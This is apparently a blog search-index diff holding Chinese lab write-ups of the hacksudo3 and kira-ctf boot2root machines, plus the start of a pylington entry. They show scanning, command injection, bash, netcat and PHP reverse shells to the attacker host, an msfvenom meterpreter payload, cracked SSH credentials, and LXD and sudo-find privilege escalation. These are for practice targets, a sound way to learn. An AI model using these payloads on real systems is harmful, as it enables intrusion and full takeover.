class="line">OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0</span><br><span class="line">OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S</span><br><span class="line">OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R</span><br><span class="line">OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N</span><br><span class="line">OS:%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.61 ms hacksudo.lan (192.168.4.141)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<p><img data-src="./hacksudo3/1.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.141/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/23 04:55:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/login.php (Status: 200)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/create (Status: 301)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/generator.php (Status: 200)</span><br><span class="line">/hidden (Status: 301)</span><br><span class="line">/decrypt (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/bruteforce (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/23 04:58:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
+<li>首页</li>
+</ul>
+<p><img data-src="./hacksudo3/2.png" alt></p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><a href="http://192.168.4.141/generator.php" target="_blank" rel="noopener">http://192.168.4.141/generator.php</a></p>
+<p><img data-src="./hacksudo3/3.png" alt></p>
+<p><img data-src="./hacksudo3/4.png" alt></p>
+<ul>
+<li>反弹<code>shell</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`id`</span><br><span class="line"><span class="meta">#</span><span class="bash"> fail</span></span><br><span class="line">`/bin/bash -i &gt;&amp; /dev/tcp/192.168.4.40/7777 0&gt;&amp;1`</span><br><span class="line">`nc -e /bin/bash 192.168.4.40 7777`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> successful</span></span><br><span class="line">`/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.4.40/7777 0&gt;&amp;1'`</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./hacksudo3/5.png" alt></p>
+<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><ul>
+<li>敏感信息文件</li>
+</ul>
+<p><img data-src="./hacksudo3/6.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacksudo</span><br><span class="line">unpxfhqb ybpxre FFU hfreanzr:unpxfhqb cnffjbeq:63p9142792q571q0s7p28ro30626q6s38792n2r7679o76q784231676q62447so80ns8953745s709p6622qqn2po4q754p262q0q31o3030n08s7o524079n6o336o</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>破解</li>
+</ul>
+<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a></p>
+<p><img data-src="./hacksudo3/7.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hacksudo locker SSH username:hacksudo password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a><br><img data-src="./hacksudo3/8.png" alt></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hacksudo / vishal</span><br></pre></td></tr></table></figure>
+
+<p>备注：这里直接<code>ssh</code>是不可以的，需要<code>www-data</code> <code>su</code>指令切过去</p>
+<ul>
+<li><code>lxd</code>提权</li>
+</ul>
+<p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
+<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> build a simple alpine image</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine</span><br><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./hacksudo3/9.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali</span></span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vuln</span></span><br><span class="line">wget http://192.168.4.40/alpine-v3.8-x86_64-20210423_0835.tar.gz</span><br><span class="line"></span><br><span class="line">lxc image import ./alpine-v3.8-x86_64-20210423_0835.tar.gz --alias myimage</span><br><span class="line">lxd init</span><br><span class="line">lxc init myimage ignite -c security.privileged=true</span><br><span class="line">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./hacksudo3/10.png" alt></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>综合靶场测试</tag>
+        <tag>hacksudo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hard_socnet2</title>
     <url>/2021/10/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hard_socnet2/</url>
     <content><![CDATA[<h1 id="hard-socnet2"><a href="#hard-socnet2" class="headerlink" title="hard_socnet2"></a>hard_socnet2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
@@ -14957,86 +15035,8 @@ git pull
       </tags>
   </entry>
   <entry>
-    <title>hacksudo3</title>
-    <url>/2021/04/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo3/</url>
-    <content><![CDATA[<h1 id="hacksudo3"><a href="#hacksudo3" class="headerlink" title="hacksudo3"></a>hacksudo3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
-<a id="more"></a>
-
-<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
-<li>kali2020</li>
-<li>hacksudo3</li>
-<li>windows10</li>
-</ul>
-<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/log# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.141   08:00:27:b3:dc:c3       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.160   68:07:15:e5:9f:39       Intel Corporate</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">7 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.943 seconds (131.76 hosts/sec). 7 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目标为 <code>192.168.4.141</code></li>
-<li><code>NMAP</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/var/log# nmap -sV -A -p 1-65535 192.168.4.141</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 04:49 EDT</span><br><span class="line">Nmap scan report for hacksudo.lan (192.168.4.141)</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: Link Lock - Password-protect links</span><br><span class="line">MAC Address: 08:00:27:B3:DC:C3 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/23%OT=80%CT=1%CU=30567%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60828A16%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%II=I%</span><br><span class="line">OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5</span><br><span class="line">OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=</span><br><span class="line">OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%</span><br><span class="line">OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0</span><br><span class="line">OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S</span><br><span class="line">OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R</span><br><span class="line">OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N</span><br><span class="line">OS:%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.61 ms hacksudo.lan (192.168.4.141)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目录扫描</li>
-</ul>
-<p><img data-src="./hacksudo3/1.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.141/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/23 04:55:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/login.php (Status: 200)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/create (Status: 301)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/generator.php (Status: 200)</span><br><span class="line">/hidden (Status: 301)</span><br><span class="line">/decrypt (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/bruteforce (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/23 04:58:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
-
-<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
-<li>首页</li>
-</ul>
-<p><img data-src="./hacksudo3/2.png" alt></p>
-<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><a href="http://192.168.4.141/generator.php" target="_blank" rel="noopener">http://192.168.4.141/generator.php</a></p>
-<p><img data-src="./hacksudo3/3.png" alt></p>
-<p><img data-src="./hacksudo3/4.png" alt></p>
-<ul>
-<li>反弹<code>shell</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`id`</span><br><span class="line"><span class="meta">#</span><span class="bash"> fail</span></span><br><span class="line">`/bin/bash -i &gt;&amp; /dev/tcp/192.168.4.40/7777 0&gt;&amp;1`</span><br><span class="line">`nc -e /bin/bash 192.168.4.40 7777`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> successful</span></span><br><span class="line">`/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.4.40/7777 0&gt;&amp;1'`</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./hacksudo3/5.png" alt></p>
-<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><ul>
-<li>敏感信息文件</li>
-</ul>
-<p><img data-src="./hacksudo3/6.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacksudo</span><br><span class="line">unpxfhqb ybpxre FFU hfreanzr:unpxfhqb cnffjbeq:63p9142792q571q0s7p28ro30626q6s38792n2r7679o76q784231676q62447so80ns8953745s709p6622qqn2po4q754p262q0q31o3030n08s7o524079n6o336o</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>破解</li>
-</ul>
-<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a></p>
-<p><img data-src="./hacksudo3/7.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hacksudo locker SSH username:hacksudo password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a><br><img data-src="./hacksudo3/8.png" alt></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hacksudo / vishal</span><br></pre></td></tr></table></figure>
-
-<p>备注：这里直接<code>ssh</code>是不可以的，需要<code>www-data</code> <code>su</code>指令切过去</p>
-<ul>
-<li><code>lxd</code>提权</li>
-</ul>
-<p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
-<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> build a simple alpine image</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine</span><br><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./hacksudo3/9.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali</span></span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vuln</span></span><br><span class="line">wget http://192.168.4.40/alpine-v3.8-x86_64-20210423_0835.tar.gz</span><br><span class="line"></span><br><span class="line">lxc image import ./alpine-v3.8-x86_64-20210423_0835.tar.gz --alias myimage</span><br><span class="line">lxd init</span><br><span class="line">lxc init myimage ignite -c security.privileged=true</span><br><span class="line">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./hacksudo3/10.png" alt></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>综合靶场测试</tag>
-        <tag>hacksudo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ica1</title>
-    <url>/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/ica1/</url>
+    <url>/2021/11/14/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/ica1/</url>
     <content><![CDATA[<h1 id="ica1"><a href="#ica1" class="headerlink" title="ica1"></a>ica1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
 <a id="more"></a>
 
@@ -15113,6 +15113,266 @@ git pull
         <tag>入门</tag>
         <tag>综合靶场测试</tag>
         <tag>ICA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kira-ctf</title>
+    <url>/2021/01/10/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/kira-ctf/</url>
+    <content><![CDATA[<h1 id="kira-ctf"><a href="#kira-ctf" class="headerlink" title="kira-ctf"></a>kira-ctf</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2020</li>
+<li>kira-ctf</li>
+<li>windows10</li>
+</ul>
+<h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    f2:19:51:a3:22:a0       (Unknown: locally administered)</span><br><span class="line">192.168.43.43   08:00:27:33:75:54       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 192.168.43.43</li>
+<li>NMAP</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.43</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-10 01:33 EST</span><br><span class="line">Nmap scan report for 192.168.43.43</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:33:75:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                                                               </span><br><span class="line">TCP/IP fingerprint:                                                                                                                                                                                               </span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/10%OT=80%CT=1%CU=40204%PV=Y%DS=1%DC=D%G=Y%M=080027%T                                                                                                                                       </span><br><span class="line">OS:M=5FFA9FD3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I                                                                                                                                       </span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O                                                                                                                                       </span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6                                                                                                                                       </span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O                                                                                                                                       </span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=                                                                                                                                       </span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%                                                                                                                                       </span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(                                                                                                                                       </span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=                                                                                                                                       </span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.43.43</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<p><img data-src="./kira-ctf/1.png" alt></p>
+<h3 id="web登录"><a href="#web登录" class="headerlink" title="web登录"></a>web登录</h3><p><img data-src="./kira-ctf/2.png" alt></p>
+<ul>
+<li>继续进行测试</li>
+</ul>
+<p><img data-src="./kira-ctf/3.png" alt></p>
+<p><img data-src="./kira-ctf/4.png" alt></p>
+<p>比较清晰，一个文件上传+一个文件包含</p>
+<p><img data-src="./kira-ctf/5.png" alt></p>
+<h3 id="图片马-LFI-拿shell"><a href="#图片马-LFI-拿shell" class="headerlink" title="图片马+LFI 拿shell"></a>图片马+LFI 拿shell</h3><p><img data-src="./kira-ctf/6.png" alt></p>
+<ul>
+<li><p>成功利用</p>
+</li>
+<li><p>服务器写马</p>
+</li>
+</ul>
+<p><img data-src="./kira-ctf/7.png" alt></p>
+<p>发现写不进去马，应该是 服务器没权限写文件</p>
+<p>换一种方式，用php反弹shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sock=fsockopen(<span class="string">"192.168.43.86"</span>,<span class="number">7777</span>);exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现反弹失败</li>
+</ul>
+<p><img data-src="./kira-ctf/8.png" alt></p>
+<ul>
+<li>用<code>msfvenom</code>工具生成木马</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.43.86 lport=7777 -o ./ma.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> lhost后的地址为kali攻击机的地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lport后的端口号为后续监听端口号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -o后面为木马生成地址。</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./kira-ctf/9.png" alt></p>
+<ul>
+<li><code>msf</code>大法</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.43.86     # 本机ip</span><br><span class="line">set lport 7777       # 与前面的木马中的1234端口一致</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./kira-ctf/10.png" alt></p>
+<p><img data-src="./kira-ctf/11.png" alt></p>
+<p><img data-src="./kira-ctf/12.png" alt></p>
+<p>发现账户密码</p>
+<ul>
+<li>交互shell 后 su</li>
+</ul>
+<p><img data-src="./kira-ctf/13.png" alt></p>
+<ul>
+<li><code>find</code>提权</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo find bassam-pass.txt -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./kira-ctf/14.png" alt></p>
+<p><img data-src="./kira-ctf/15.png" alt></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>综合靶场测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pylington</title>
+    <url>/2021/05/19/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/pylington/</url>
+    <content><![CDATA[<h1 id="pylington"><a href="#pylington" class="headerlink" title="pylington"></a>pylington</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2020</li>
+<li>pylington</li>
+<li>windows10</li>
+</ul>
